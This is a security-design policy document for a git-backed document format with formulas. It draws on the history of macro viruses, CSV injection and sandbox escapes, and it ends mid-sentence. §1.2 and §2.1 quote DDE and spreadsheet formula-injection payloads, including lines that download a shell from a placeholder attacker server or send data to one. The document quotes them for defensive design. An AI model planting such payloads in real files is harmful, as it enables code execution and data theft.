# D12 — Security and trust boundaries for an executable, agent-read, git-backed substrate

Research date 2026-08-28. Empirical work performed locally against git 2.47.3 on
Linux 6.12.101; every demonstration constructed was inert (marker files and
`echo` only). Web claims are attributed to primary sources with URLs. **Claims
that could not be verified against a primary source in this session are marked
`[UNVERIFIED]` inline and listed again in §10.** Two research threads (git
supply-chain CVEs, encryption/erasure) reported after this section was drafted
and are integrated in §7–§9.

This document is written as a **policy**, not a survey. §9 is the policy in
normative language; everything before it is the evidence for it.

---

## 0. The one-sentence version

The substrate has three assets an attacker wants — the user's other documents,
the user's machine, and the user's agent — and a repository from a stranger is
the delivery vehicle for all three. The answer is not a better sandbox. It is
that **a repository may declare, and may never bind**: cloned bytes select
behaviour from a set the *local user* has already installed and authorised, and
can never introduce behaviour. Git already works this way, by accident of
history and then on purpose, and the substrate should copy it exactly.

---

## 1. Executable documents: forty years of the same lesson

### 1.1 The macro era, and what actually ended it

Concept (WM/Concept, 1995) was "the first functional multi-environment virus,"
written in WordBasic, infecting `NORMAL.DOT` so every subsequent Save As
propagated it (F-Secure, `f-secure.com/v-descs/concept.shtml`). Melissa (March
26, 1999) was a Word document that drove Outlook to mail itself to the first 50
address-book entries; David L. Smith was arrested April 1, 1999 and sentenced to
20 months. `[UNVERIFIED: CERT CA-1999-04 primary text — cert.org and its SEI
successor both 301 into dead legacy handlers; the advisory number is universally
cited in secondary literature but was not retrievable.]`

The interesting fact is not the viruses. It is that **twenty-seven years of
antivirus, heuristics, warnings, and user education did not fix this; one
default change did.** Microsoft Learn
(`learn.microsoft.com/en-us/microsoft-365-apps/security/internet-macros-blocked`):

> "VBA macros are a common way for malicious actors to gain access to deploy
> malware and ransomware. Therefore, to help improve security in Office, we're
> changing the default behavior of Office applications to block macros in files
> from the internet."

The mechanism is provenance, not analysis: "Mark of the Web is added by Windows
to files from an untrusted location, such as the internet or Restricted Zone"
(same page; NTFS-only, ZoneId 3/4). Rollout: Current Channel (Preview) 2203 from
April 12, 2022; Current Channel 2206 from July 27, 2022 — with a **rollback on
July 8, 2022** "while we make some additional changes to enhance usability," and
resumption July 20 (Microsoft 365 Tech Community blog,
`techcommunity.microsoft.com/blog/microsoft365blog/.../3071805`). Even Microsoft
could not ship this cleanly on the first attempt; the friction it caused was
real enough to force a retreat. `[UNVERIFIED: Proofpoint's widely-cited ~66%
macro-decline figure for Oct 2021–Jun 2022 — no primary Proofpoint URL
retrievable.]` `[UNVERIFIED: the XLM/Excel-4.0 resurgence and Microsoft's 2021
XLM default-disable + AMSI-for-XLM integration — no primary source located; a
well-known industry narrative, but do not cite it as sourced.]`

**Design reading.** Provenance-gated defaults beat content analysis. The
substrate should classify every artifact by *where it came from*, not by what it
appears to contain, and it should expect the safe default to be unpopular.

### 1.2 "It's a feature, not a vulnerability"

SensePost's DDEAUTO work (`sensepost.com/blog/2017/macro-less-code-exec-in-msword/`,
Etienne Stalmans and Saif El-Sherei) achieved code execution from a Word field —
`{DDEAUTO c:\windows\system32\cmd.exe "/k calc.exe"}` — with no macros and no
memory corruption, bypassing every macro-filtering gateway. Microsoft's reply,
quoted from SensePost's own disclosure timeline (26/09/2017):

> "Microsoft responded that as suggested it is a feature and no further action
> will be taken, and will be considered for a next-version candidate bug."

`[UNVERIFIED: the text of ADV170021 itself — MSRC's update guide is a JS SPA.]`

This is the single most important precedent in the whole file for a product that
intends to ship user-authored formulas. **Every general-purpose evaluation
facility is somebody's feature, and the security team loses that argument until
there is an incident.** The way to win it is to not have the argument: make the
capability structurally absent rather than disabled.

The OLE/embedding line confirms the pattern, all verbatim from NVD:

- **CVE-2017-0199** — Office/WordPad RCE "via Windows API," crafted document,
  CVSS 7.8, published 2017-04-12.
- **CVE-2017-8759** — .NET 2.0–4.7 "allow an attacker to execute code remotely
  via a malicious document or application" (SOAP WSDL parser injection,
  delivered by a Word doc).
- **CVE-2022-30190 (Follina)** — "A remote code execution vulnerability exists
  when MSDT is called using the URL protocol from a calling application such as
  Word. An attacker who successfully exploits this vulnerability can run
  arbitrary code with the privileges of the calling application."

Follina is worth dwelling on: the document did not execute anything. It named a
URL scheme, and *the platform* executed. A substrate whose files name derivation
rules, formula plugins and merge drivers is in exactly that business.

### 1.3 The archival-format precedent: PDF/A

PDF/A forbids the executable layer outright: "JavaScript and executable file
launches are forbidden" and "External content references are forbidden"
(`en.wikipedia.org/wiki/PDF/A`). `[UNVERIFIED: verbatim ISO 19005 spec wording —
iso.org and pdfa.org both 403'd; the substance is consistent across every
secondary source and is not in dispute, but the quote above is Wikipedia's
paraphrase, not spec text.]` The concrete reason it exists: **CVE-2010-1240**,
Adobe Reader 9.x/8.x, which "do not restrict the contents of one text field in
the Launch File warning dialog, which makes it easier for remote attackers to
trick users into executing an arbitrary local program" (NVD) — a warning dialog
defeated by letting the attacker write part of the warning.

The precedent that matters: **the archival profile of a document format is
defined by subtraction.** PDF/A is PDF minus execution and minus external
references. A durable, shareable, long-lived artifact format is exactly what
this substrate claims to be, and the industry's own answer for that category is
already "no execution, no external references."

PostScript is the counter-case: Turing-complete by design, and its sandbox has
been repeatedly broken. **CVE-2018-16509**: "Incorrect 'restoration of
privilege' checking during handling of /invalidaccess exceptions could be used
by attackers able to supply crafted PostScript to execute code using the 'pipe'
instruction" (NVD) — a `-dSAFER` bypass.

### 1.4 TeX's restricted shell escape — the best available model, and its failure

This is the design worth copying, and the way it broke is the design lesson.
From the canonical TeX Live `texmf.cnf`
(`raw.githubusercontent.com/TeX-Live/texlive-source/master/texk/kpathsea/texmf.cnf`):

```
shell_escape = p
shell_escape_commands = \
  bibtex,bibtex8,\
  extractbb,\
  gregorio,\
  kpsewhich,\
  l3sys-query,\
  latexminted,\
  makeindex,\
  memoize-extract.pl,\
  memoize-extract.py,\
  repstopdf,\
  r-mpost,\
  texosquery-jre8,\
```

`shell_escape = p` is restricted/partial mode: only these exact program names may
be invoked through `\write18`, whatever the document's argument says. `t`
(unrestricted) requires an explicit `--shell-escape`; unset is fully disabled.

Three properties make this good, and they are directly transferable:

1. **The allowlist is by program identity, not by inspecting the argument.**
   There is no attempt to decide whether a command string is safe. Only a
   fixed set of names is reachable.
2. **The document may request; the engine decides.** The document cannot extend
   the list. The list ships with the engine and the local installation.
3. **The dangerous mode is a command-line flag the human types**, per
   invocation, not a property of the document.

And here is how it failed anyway — **CVE-2023-32700** (NVD):

> "LuaTeX before 1.17.0 allows execution of arbitrary shell commands when
> compiling a TeX file obtained from an untrusted source. This occurs because
> luatex-core.lua lets the original io.popen be accessed."

CVSS 7.8, affecting LuaTeX 1.04–1.16.2, MiKTeX 2.9.6300–23.4, TeX Live
2017–2022. The allowlist was never bypassed. It was **bypassed around**: LuaTeX
added an embedded scripting language with its own `os.execute`/`io.popen`, and
those primitives were not `\write18`, so the restricted-shell-escape machinery
never saw them. Separately, **CVE-2018-17407** (NVD) — a buffer overflow in
`t1_check_unusual_charstring` in `writet1.c`, arbitrary code execution via a
malicious Type 1 font loaded by pdflatex/pdftex/dvips/luatex — broke the sandbox
from *inside* an allowlisted operation.

**Two rules fall out, and they are the core of this document's recommendation:**

- **R1. An allowlist on one execution primitive is worth nothing if a second
  execution primitive exists.** The count of ways to execute must be one, and it
  must be enumerable by reading the code, not by reading the docs.
- **R2. A parser reachable from untrusted input is an execution primitive**,
  whether or not you think of it as one. CVE-2018-17407 is a font parser.

### 1.5 LibreOffice: the trust check is the vulnerability

All NVD-verified:

- **CVE-2022-26305** — "An Improper Certificate Validation vulnerability in
  LibreOffice existed where determining if a macro was signed by a trusted
  author was done by only matching the serial number and issuer string of the
  used certificate with that of a trusted certificate." CVSS 7.5, CWE-295.
  The **trusted-author check itself** was forgeable.
- **CVE-2018-16858** — directory traversal allowing LibreOffice "to execute a
  Python method from a script in any arbitrary file system location, specified
  relative to the LibreOffice install location," triggered by opening a document.
- **CVE-2023-2255** — documents using "floating frames" linked to external files
  "would load the contents of those frames without prompting the user for
  permission," inconsistent with LibreOffice's normal external-link prompt.
- CVE-2022-26306 (static IV) and CVE-2022-26307 (master key entropy reduced
  "from 128 to 43 bits") round out the picture.

CVE-2023-2255 is the one to internalise. LibreOffice had a correct policy —
prompt before loading external content — and **one feature was wired up without
the prompt.** Consent gates enforced feature-by-feature will be forgotten
feature-by-feature. The gate must sit at a chokepoint that every path is
structurally forced through.

### 1.6 Jupyter: the closest analogue, and it is narrower than people think

This is the nearest existing thing to "a document that computes, stored in a
repo," and its trust model is routinely misdescribed. From the actual docs
source (`raw.githubusercontent.com/jupyter/notebook/6.4.x/docs/source/security.rst`),
the stated goal:

> "no code should execute just because a user has opened a notebook that they
> did not write."

Signatures are computed over notebook content and stored in a database; trust is
re-evaluated on load and updated on save; a user can trust explicitly via
`jupyter trust` or the File menu. But the scope is the part that matters:

> "Outputs generated by the user are trusted"

**The signature governs whether saved outputs render — untrusted HTML is
sanitised and untrusted JavaScript in outputs is never executed. It does not
gate whether code cells run.** Code cells run when the user runs them,
signature or no signature. Jupyter's trust model protects against *replay of
stored active content*, not against *the document's own program*. Markdown-cell
JS/CSS is now stripped entirely, having previously been a bypass vector.
`[UNVERIFIED: the exact paths `notebook_secret` and
`~/.local/share/jupyter/nbsignatures.db` — the fetch summarised signature
storage without surfacing the literal strings.]` Note also that
**CVE-2022-29238** is *not* a trust-model bug — it is an access-control bug
where requests "only prevented listing the contents of hidden directories, not
accessing individual hidden files" under `ContentsManager.allow_hidden = False`.
No trust-signing CVE was located.

**Why this matters here, sharply.** The substrate's tables recompute
automatically — that is the product. So the substrate is in a *strictly worse*
position than Jupyter: Jupyter has a human pressing Shift+Enter as the
authorisation event, and even so it needs a signature database for the
comparatively minor problem of stored HTML. A substrate whose derivation engine
recomputes on open has **no authorisation event at all**. That is the gap the
rest of this document has to close, and the only way to close it without a
consent prompt on every file open is to make recomputation *incapable* of harm —
which means the formula language, not the sandbox, is the primary control.

---

## 2. Formula injection, and why escaping is not available here

### 2.1 The classical attack

OWASP (`owasp.org/www-community/attacks/CSV_Injection`):

> "When a spreadsheet program such as Microsoft Excel or LibreOffice Calc is
> used to open a CSV, any cells starting with `=` will be interpreted by the
> software as a formula."

Dangerous leading characters per OWASP: `=`, `+`, `-`, `@`, tab (`0x09`), CR
(`0x0D`), LF (`0x0A`). And the countermeasure caveat, quoted from the same page,
which is the sentence that decides this section:

> "Microsoft Excel may remove quotes or escape characters from CSV cells when a
> file is saved and re-opened"

Canonical payloads (PayloadsAllTheThings, `github.com/swisskyrepo/PayloadsAllTheThings`):

```
=cmd|' /C calc'!A0
@SUM(1+1)*cmd|' /C calc'!A0
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=rundll32|'URL.dll,OpenURL calc.exe'!A
=IMPORTXML("http://ATTACKER.DOMAIN/csv", "//a/@href")
```

The last one is the important one for this design: it is not RCE, it is
**exfiltration by evaluation**. A formula that can fetch a URL can encode
neighbouring cell values into that URL. Confirmed as a documented Google Sheets
vector. `[UNVERIFIED: the original 2014 Context Information Security "Comma
Separated Vulnerabilities" post — contextis.com now 301s to accenture.com and
archive.org is blocked, so the payload's origin is attributed via
PayloadsAllTheThings' citation rather than the primary text.]` `[UNVERIFIED: a
specific documented `WEBSERVICE()`/`HYPERLINK()` exfiltration incident; any
specific HackerOne disclosed CSV-injection report; Excel Protected View, Google
Sheets IMPORT* prompting, and LibreOffice link-update prompt behaviour were not
re-fetched from vendor docs.]`

PapaParse's mitigation, from its docs (`papaparse.com/docs`), verbatim:

> "If `true`, field values that begin with `=`, `+`, `-`, `@`, `\t`, or `\r`,
> will be prepended with a `'`."

Its limits are structural: it is **off by default**, it is overridable with a
custom regex, and per OWASP's caveat above the `'` can be stripped by a
round-trip through Excel. Note that Pithy — the closest competitor teardown in
`RESEARCH.md` — ships `escapeFormulae` and *no formula engine*. That is a
coherent position. It is not this product's position.

### 2.2 The design question: escaping is unavailable by construction

Escaping works because the escaper knows that a leading `=` is *never* wanted.
In this substrate a leading `=` in a column header is **the feature**. There is
no syntactic signal distinguishing a hostile formula from an intended one,
because there is no distinction: they are the same construct, authored the same
way, by different people.

So the classical mitigation is gone, and with it the whole "sanitise the input"
family. Three positions remain:

- **(a) Capability**: formulas are evaluated, but the evaluator has no capability
  to do harm — no I/O, no shell, no network, no filesystem, bounded time and
  memory. Harm becomes *unrepresentable* rather than *filtered*.
- **(b) Consent**: formulas are evaluated only after the user authorises this
  repo. Preserves power, imports Jupyter's problem, and — per §1.5 — consent
  gates decay.
- **(c) Provenance**: what happens depends on where the file came from, per §1.1.

**These are not alternatives. (a) is the floor, (c) is the default policy, and
(b) is reserved for the narrow set of things (a) cannot cover.** The rest of
this document is mostly about keeping that narrow set narrow.

### 2.3 What must happen when a user opens a repo cloned from a stranger

Concretely and prescriptively — this is the answer to the question as posed:

1. **The clone itself executes nothing.** No hooks, no filters, no merge
   drivers, no derivation rules, no plugins, no schema code, no formatters. See
   §7 for why git already gives this for free and how the substrate loses it if
   it is careless.
2. **The repo is marked `untrusted` on first sight**, recorded in *local* state
   keyed by remote URL + first-commit OID (never in the repo — see §6.5).
3. **Documents open and render.** Text, tables, and slides display. This must
   work fully, because a viewer that demands trust before showing anything
   trains users to grant trust reflexively.
4. **Formulas evaluate**, because under §3's recommendation evaluation is
   incapable of harm. This is the entire payoff of choosing a total language:
   *the stranger's spreadsheet computes correctly and safely with no prompt.*
   Evaluation is bounded by an explicit step/memory budget; on exhaustion the
   cell shows a budget error, never a partial or stale value.
5. **Cross-artifact derivation is confined to the repo.** A derivation in an
   untrusted repo may read only artifacts within that same repo. It may not
   reference another repo, the filesystem, the network, the clock, the
   environment, or any user identity.
6. **Nothing outbound happens.** No URL in the repo is fetched — not images, not
   fonts, not stylesheets, not link previews, not favicons, not schema `$ref`s.
   This is a hard rule and it is §6's rule, not a rendering nicety.
7. **Named-but-unbound behaviours degrade visibly, never silently.** If the repo
   declares `merge=daffmerge` or `formula-plugin=finance` and the local install
   has no such thing, the user is *told*, in the document, that a declared
   behaviour is inactive. Git's silent fail-open (§6.4, measured) is the
   anti-pattern to fix, not to copy.
8. **Agents get the untrusted-content treatment of §6** — the repo is attacker
   text, and the agent reading it is the target.
9. **Trust, when granted, is granted per-repo, explicitly, with an itemised
   list of what is being enabled, and is revocable.** It is never granted by
   opening a document, never inferred from "the user edited a file," and never
   inherited by submodules or by a repo that shares a remote host.

Notice what is *not* on this list: a prompt on open. Under (a)+(c) the common
case needs no prompt at all, which is what makes the rare prompt meaningful.

---

## 3. Sandboxing in 2026, assessed honestly — and why it is the second question

### 3.1 The runtimes

**WebAssembly.** The capability model is the genuinely good part: a module has
no ambient authority whatsoever and can reach only what the host explicitly
imports into it. WASI 0.2 (Preview 2) shipped 2024-01-25, defining WASI over the
Component Model with WIT interface types
(`en.wikipedia.org/wiki/WebAssembly_System_Interface`); WASI 0.3 (async) was
still forthcoming as of the source checked.

But the escape history is live and current, from wasmtime's own advisories
(`github.com/bytecodealliance/wasmtime/security/advisories`):

- **CVE-2026-34971** — "Miscompiled guest heap access enables sandbox escape on
  aarch64 Cranelift," **Critical**, 2026-04-09.
- **CVE-2026-34987** — "Winch compiler on aarch64 enables sandbox-escaping
  memory access," **Critical**, 2026-04-10.
- **CVE-2025-64345** — unsound shared-memory API access, Low, 2025-11.
- **CVE-2024-51745** — incomplete Windows device-filename sandboxing, Low.
- A cap-std filesystem sandbox escape via trailing-slash symlink handling,
  CVSS 8.8 High, affecting essentially every release line ≤47.0.3 (Linux 5.6+
  using `openat2` unaffected).

`[UNVERIFIED: CVE-2023-26489, CVE-2022-39392, CVE-2021-39216 by number — NVD and
cve.org returned JS shells to the fetcher. The overall advisory stream is
confirmed; those three specific numbers are not.]`

**Two Critical sandbox escapes in two days in April 2026** is the number to
carry. Wasm is the best available *general* isolation for untrusted code and it
is still a compiler, and compilers miscompile. Performance, from "Not So Fast:
Analyzing the Performance of WebAssembly vs. Native Code" (USENIX ATC 2019, via
Wikipedia's citation of it): "an average slowdown of 45% in Firefox and 55% in
Chrome across the real-world benchmarks; peak slowdowns resulted in a Wasm
program taking 2.08 times as long to run in Firefox and 2.5 times as long to run
in Chrome."

**V8 isolates.** Cloudflare's own security model page
(`developers.cloudflare.com/workers/reference/security-model`) states V8
"executes code inside isolates, which prevent that code from accessing memory
outside the isolate — even within the same process," and is explicit that many
isolates share **one process**, with Linux namespaces and seccomp layered
underneath. So the boundary is language-level, and a V8 memory-safety bug
crosses it. The stream is relentless and actively exploited — all three
CISA-KEV-listed: **CVE-2024-4947** (type confusion, Chrome <125.0.6422.60),
**CVE-2025-6554** (type confusion, <138.0.7204.96, arbitrary read/write),
**CVE-2025-13223** (type confusion, <142.0.7444.175, heap corruption).
Cloudflare's own architecture — isolates *plus* seccomp *plus* namespaces — is
the honest statement of how much isolates are worth alone.

**Deno.** The best-articulated capability model in a mainstream runtime: "Deno
is sandboxed by default: code cannot touch the file system, network,
environment, or run subprocesses unless you allow it," with `--deny-*` flags
that "override their allow counterparts, so you can grant a broad category and
carve out the sensitive parts" (`docs.deno.com/runtime/fundamentals/security`).
And its own docs concede the holes, verbatim — for `--allow-run` and
`--allow-ffi`:

> "Treat both as equivalent to `--allow-all` when deciding whether to trust the
> code you are running"

Which restates R1 exactly: two escape hatches make the other flags decorative.

**Node.js.** `--permission` is now Stable (v23.5.0/v22.13.0), and Node's own
documentation (`nodejs.org/api/permissions.html`) disqualifies it for this use
in its own words:

> "The permission model implements a 'seat belt' approach, which prevents
> trusted code from unintentionally changing files or using resources that
> access has not explicitly been granted to. It does not provide security
> guarantees in the presence of malicious code. Malicious code can bypass the
> permission model and execute arbitrary code without the restrictions imposed
> by the permission model."

and, citing Node's SECURITY.md: **"Node.js trusts any code it is asked to run."**
This is a seat belt, not a boundary. Do not build on it.

**Lua.** `[UNVERIFIED: no specific credible writeup retrievable this session.]`
The standard leak set — the shared string metatable reachable from any string
value, `load`/`loadstring` restoring arbitrary code execution, the `debug`
library's `getupvalue`/`setupvalue` breaking closure encapsulation, `getfenv`/
`setfenv` in 5.1 letting sandboxed code swap its own environment, and coroutines
frustrating CPU accounting — is standard knowledge but is flagged as not
re-verified. The structural point stands regardless: Lua sandboxes are built by
*removing* things from a permissive default, and denylists of this shape are
never finished.

**Python — the precedent that should settle the argument.** From
`docs.python.org/2.6/library/rexec.html`, verbatim:

> "While the rexec module is designed to perform as described below, it does
> have a few known vulnerabilities which could be exploited by carefully written
> code. Thus it should not be relied upon in situations requiring 'production
> ready' security."

and:

> "The RExec class can prevent code from performing unsafe operations like
> reading or writing disk files, or using TCP/IP sockets. However, it does not
> protect against code using extremely large amounts of memory or processor
> time."

`rexec` and `Bastion` were removed in Python 3.0. `[UNVERIFIED: Guido's specific
2003 python-dev post — not located this session. Do not attribute a quote to him
on the strength of this document.]` The mechanism of failure is best shown by
Ned Batchelder, "Eval really is dangerous"
(`nedbatchelder.com/blog/201206/eval_really_is_dangerous.html`), whose canonical
bypass is `().__class__.__bases__[0].__subclasses__()` — reflection reaches the
whole object graph from any literal, so no denylist over names can hold. His
conclusion is to sandbox at the OS level instead.

RestrictedPython says the same about itself
(`github.com/zopefoundation/RestrictedPython`):

> "RestrictedPython is not a sandbox system or a secured environment, but it
> helps to define a trusted environment and execute untrusted code inside of it"

and

> "RestrictedPython ships no `__import__` implementation on purpose. If you
> provide one, you move the security boundary out of RestrictedPython and into
> your own import policy."

PyPy's sandbox is effectively dead: "This describes the old, unmaintained
version. A new version is in progress in the `sandbox-2` and `py3.6-sandbox-2`
branches" (`doc.pypy.org/en/latest/sandbox.html`).

**And here is the fact that decides the whole section.** Grist runs Python
formulas — the nearest shipping product to what is being designed — and its own
self-managed docs (`support.getgrist.com`) recommend:

> "We recommend setting the environment variable `GRIST_SANDBOX_FLAVOR` to
> `gvisor` if your hardware supports it (most will), to run formulas in each
> document within a sandbox isolated from other documents and isolated from the
> network."

with requirements including the x86-64 XSAVE flag and the `SYS_PTRACE`
capability. **Grist's answer to "can we sandbox Python formulas" is a
container-grade OS kernel reimplementation.** That is the true cost of choosing
a general-purpose language for the formula layer: gVisor, an ambient
`SYS_PTRACE` capability, a hardware requirement, a per-document process, and a
non-gVisor fallback flavour that is by implication weaker. For a local desktop
app that must also run on macOS, Windows, and — per `RESEARCH.md` §4 — mobile,
this is not portable. It is a server product's answer.

**OS primitives.** Landlock has been mainline since Linux 5.13 and has reached
ABI 10, adding capabilities steadily (ABI 2 `FS_REFER`, 3 `FS_TRUNCATE`, 4 TCP
bind/connect, 5 `FS_IOCTL_DEV`, 6 IPC scoping, 7 logging, 8
`RESTRICT_SELF_TSYNC`, 9 `FS_RESOLVE_UNIX`, 10 UDP)
(`docs.kernel.org/userspace-api/landlock.html`). That ABI ladder is itself the
warning: an application must negotiate a *best-effort* subset against whatever
kernel it finds, so its guarantees vary per machine. Bubblewrap
(`github.com/containers/bubblewrap`) is "a low-level unprivileged sandboxing
tool used by Flatpak and similar projects," built on user namespaces, setuid
fallback removed; CVE-2017-5226 (TIOCSTI injection) is the known CVE, mitigated
by seccomp-filtering TIOCSTI or `--new-session`. Bubblewrap's docs are clear
that it is mechanism, not policy — security depends wholly on the caller's
flags. All three are Linux-only, which for a cross-platform document product
means they can be *defence in depth* and never *the* defence.

### 3.2 The honest conclusion

Every general-purpose sandbox on this list is (i) large, (ii) has a live escape
history, (iii) costs 45–150% or a whole guest kernel, and (iv) is
platform-specific or has platform-specific gaps. None of them is a good place to
put the *primary* trust boundary of a document format that must open a
stranger's file on four platforms, instantly, with no prompt.

**So the sandbox is the second question. The first is what the language can
express.** A sandbox constrains a powerful language's effects at runtime, on
every platform, forever, correctly. A total language has no effects to
constrain. The evidence above says the first of those is a decades-long losing
record and the second is a solved problem.

---

## 4. The non-Turing-complete argument

### 4.1 The precedents, in their own words

**Starlark** (`github.com/bazelbuild/starlark/blob/master/spec.md`):

> "Execution is finite. The language does not allow recursion or unbounded loops."

> "The language is deterministic and hermetic. Executing the same file with the
> same interpreter leads to the same result."

> "By default, user code cannot interact with the environment."

> "Starlark is suitable for use in highly parallel applications... because shared
> data structures become immutable due to freezing."

No `while` at all; `for` only over finite iterables. That last property —
parallel-safety by construction — is not incidental for this design. A
content-addressed derivation engine recomputing across artifacts *wants* to
evaluate in parallel and to cache by input hash, and both are free only if
evaluation is deterministic and effect-free. **Determinism is not merely a
security property here; it is the precondition for the derivation engine's
caching to be correct at all.** A formula that can read the clock or the network
makes the content-addressed cache silently wrong — which is the same class of
failure as `RESEARCH.md` §3's A1-merge result: a wrong number with no marker.

**Dhall** (`github.com/dhall-lang/dhall-lang/wiki/Safety-guarantees`):

> "Dhall is a 'total' functional programming language, which means that: You can
> always type-check an expression in a finite amount of time. If an expression
> type-checks then evaluating that expression always succeeds in a finite amount
> of time."

A type-checked Dhall program will never "throw an exception, crash or segfault,
accept malformed input, produce malformed output, hang or time out." Totality
comes from prohibiting general recursion in favour of `List/fold` and friends.

**CEL** (`cel.dev`): "Non-Turing complete, and only accesses data provided by the
host application," "fast, portable, and safe to execute in performance-critical
applications," evaluating in "nanoseconds to microseconds." The spec
(`github.com/google/cel-spec`, `langdef.md`) states **"CEL programs cannot loop
forever."**

**Datalog**: stratified Datalog terminates with PTIME data complexity, because
forbidding function symbols bounds the Herbrand universe. (Textbook result; not
re-cited.)

**Spreadsheet formulas themselves** were non-Turing-complete until LAMBDA
(Dec 2020). `[UNVERIFIED: Microsoft's exact announcement wording, including the
widely-quoted "Turing-complete" and "world's most widely used programming
language" phrasings — techcommunity forced an OAuth redirect, the MSR URL 404'd,
archive.org is blocked. The mechanism is not in dispute: LAMBDA can call itself
by name, which is what crosses the threshold.]` Note what Excel actually does
about runaway recursion: a **configurable max-iterations setting, default 100**.
Excel's real termination guarantee is an engineering cutoff, not a theorem —
precisely the "computational budget" that CEL formalises and pre-2020 Excel did
not need.

### 4.2 What is lost, and does anyone need it

The one hard number retrievable from the corpus literature, Hermans &
Murphy-Hill, "Enron's Spreadsheets and Related Emails" (ICSE 2015):

> "76% of spreadsheets in the presented corpus use the same 15 functions"

and, from the same work, **"24% of Enron spreadsheets with at least one formula
contain an Excel error"** — Enron's sheets being "substantially more smelly"
than the EUSES corpus, "especially in terms of long calculation chains."
`[UNVERIFIED: fraction of workbooks containing any formula; average formula
complexity; VBA prevalence; iterative-calculation prevalence — full text not
retrievable (ACM DL/ResearchGate 403).]`

Three-quarters of formulas in a large real corporate corpus draw on fifteen
functions. That is suggestive, not dispositive, but it points the same way as
every other signal: **the demand for recursion and general iteration is a long
tail, and the long tail is exactly the population that already has VBA, Python,
and LAMBDA — and is not this product's audience.** `RESEARCH.md` §7 is explicit
that the audience question is the open one and that the developer-orchestrating-
agents niche is taken. Choosing totality forfeits the power users. It does not
forfeit the target market, and the 24% error rate is a reminder that giving end
users *more* computational power has a measured cost in correctness.

The second thing lost is honest and should be stated plainly: **a total language
cannot express a fixed-point / goal-seek / circular-reference model** (Excel's
iterative calculation), and cannot express user-defined recursive functions.
Amortisation schedules, IRR, and Monte Carlo are the recognisable casualties.
The mitigation is that these are *host-provided functions*, not user-authored
recursion — `IRR()` is a builtin with a bounded internal solver, which is
exactly how CEL's extension-function model works and how spreadsheets have
always shipped `RATE` and `XIRR` anyway.

### 4.3 The escape hatch always grows — the pattern, documented

This is the part that must survive contact with reality, because the pattern is
universal.

- **Bazel.** `bazel.build/extending/repo`: `repository_ctx` enables
  "non-hermetic functions (finding a binary, executing a binary, creating a file
  in the repository or downloading a file from the Internet)." The hermeticity
  page concedes older workspace rules "are rich enough to allow arbitrary
  processing to happen in the process." `repository_ctx.execute()` runs an
  arbitrary argv, bounded only by a `timeout` (default 600s). Mitigations are
  *hashes*: download functions require SHA-256 to count as hermetic, and the
  bzlmod lockfile records `bzlTransitiveDigest`/`usagesDigest`/
  `generatedRepoSpecs` so that "all remote inputs are hashed... ensures a fully
  reproducible resolution result."
- **Dhall.** Remote HTTP imports, pinned by *semantic* integrity check: "Dhall's
  integrity checks are 'semantic' integrity checks, meaning that they are hashes
  of an expression's normal form," and "An import frozen in this way can never
  successfully return a different expression." Plus containment: local-file and
  `env:` imports cannot be reached *transitively through* a remote import, and
  "Custom headers are only transferred for relative imports, which can only
  reference expressions from the same domain."
- **Nix.** `--pure-eval` / `restrict-eval` mark `currentSystem`, `currentTime`,
  `storePath`, `fetchTarball`, `fetchurl` unavailable. And then
  `builtins.exec` — whose source comment in `primops.cc` is merely "Execute a
  program and parse its output. FIXME: This doesn't work with chroot stores" —
  gated behind the config option `allow-unsafe-native-code-during-evaluation`,
  documented as "Whether builtin functions that allow executing native code
  should be enabled," **default false**.
- **Terraform.** HashiCorp's own docs on `provisioner "local-exec"`: "You should
  exhaust all alternatives before using provisioners in your configurations.
  This is because Terraform cannot predictably model provisioner behaviors
  represented in the configuration." Plus an `external` data source that shells
  out and parses JSON at plan time — structurally identical to Bazel repo rules.
- **CUE** holds the line differently: "CUE takes the stance that computation and
  configuration should be separated," with scripting split into a separate
  `cue cmd` layer rather than baked into the constraint language.
- `[UNVERIFIED: Helm/Ansible/Jsonnet specifics not re-fetched; the general
  characterisation is standard but uncited here.]`

And the essay that names the whole phenomenon — Mike Hadlow, "The Configuration
Complexity Clock" (`mikehadlow.blogspot.com/2012/05/configuration-complexity-clock.html`,
May 2012). The progression runs hard-coded → config file → XML schema →
database + GUI → DSL, arriving at:

> "we're back where we started four years ago, hard coding everything, except
> now in a much crappier language."

and the thesis:

> "At a certain level of complexity, hard-coding a solution may be the least
> evil option."

### 4.4 The position that survives the pattern

The lesson of §4.3 is **not** "totality is futile." Read the list again: every
one of those systems kept its *core* total and put the impurity in a **separate,
named, hashed, default-off layer**. Nix did not add `exec` to the language; it
added a config flag that is false. Dhall did not weaken totality; it added a
content hash. Bazel did not make Starlark impure; it put execution in a
different phase with a lockfile.

So the position to adopt — and it is a design commitment, not an aspiration:

> **P1. The formula/derivation language is total, terminating, deterministic and
> I/O-free, with no exceptions and no flag that changes this.**
>
> **P2. Extension happens only by host-provided functions, never by
> user-authored code in the artifact.** New functions arrive by the user
> installing a plugin locally — the same act as installing a git merge driver.
> An artifact may *name* `finance.XIRR`; it can never *define* it.
>
> **P3. There is exactly one escape hatch, it is a different phase, it is
> off by default, and it is not reachable from a document.** If the product
> eventually needs "run a script to import data," it is a command the user
> invokes, in a separate process, with a separate consent record — not a cell
> that evaluates.

P2 is the load-bearing one, because it is what stops the clock. Hadlow's clock
turns when the config language must absorb new capability. Here new capability
arrives as *native code the user chose to install*, which routes around the
clock entirely: the artifact format stays at 12 o'clock forever because it was
never the thing that had to grow.

### 4.5 Recommendation: the formula language

**Non-Turing-complete. Total. And do not adopt CEL as the surface language.**

CEL is the right *architecture* and the wrong *language*, and it is worth being
precise about why, because it is the strongest candidate.

What CEL gets right and should be copied wholesale: guaranteed termination
("CEL programs cannot loop forever"); host-only extension functions that must be
side-effect-free; and — most valuable of all — a **formal cost model**. The spec
defines abstract size metrics per type and complexity per operation: linear for
most, quadratic for string search and map operations, exponential for nested
macros, with implementations required to support at least "12 nested calls and
32 sequential operators," and hosts registering extension functions made
"responsible for noting the computational complexity" of what they add. A static
pre-execution cost bound *plus* a runtime step limit is exactly the pair a
derivation engine needs, and almost no spreadsheet engine has it.

Why it should not be the user-facing syntax:

1. **No cell ranges or grid model.** CEL is scalar/list/map over one input
   document. `A1:B10`, relative/absolute references, spilling, and a
   recalculation-ordered dependency mesh would all be host scaffolding. Per
   `RESEARCH.md` §3 the addressing model here is *named columns*, which is
   closer to CEL's map model than A1 is — so this is a smaller gap than it looks,
   but it is still the majority of the work.
2. **No user-defined functions of any kind.** CEL distinguishes builtins from
   host-registered extension functions and has no in-language `def`. Under P2
   that is a *feature*, not a defect — but it means the "define a named
